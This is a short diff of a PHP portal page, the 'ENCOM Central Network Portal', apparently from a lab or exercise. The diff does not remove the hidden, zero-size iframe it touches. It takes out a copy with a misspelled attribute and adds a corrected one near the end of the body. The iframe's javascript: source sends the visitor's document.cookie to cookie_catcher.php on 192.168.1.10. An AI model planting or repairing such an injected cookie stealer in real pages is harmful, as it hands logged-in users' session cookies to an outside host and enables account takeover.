@@ -21,7 +21,6 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true || $_SESSION
     </style>
 </head>
 <body>
-<iframe frameboarder=0 height=0 width=0 src=javascript:void(document.location="http://192.168.1.10/cookie_catcher.php?c="+document.cookie) </iframe >
 <div class="container">
     <h1>Welcome to the ENCOM Central Network Portal</h1>
     <p>System Status: ONLINE</p>
@@ -34,6 +33,6 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true || $_SESSION
     <hr>
     <p><a href="logout.php">Terminate Session (Logout)</a></p>
 </div>
-
+<iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://192.168.1.10/cookie_catcher.php?c="+document.cookie) </iframe >
 </body>
 </html>
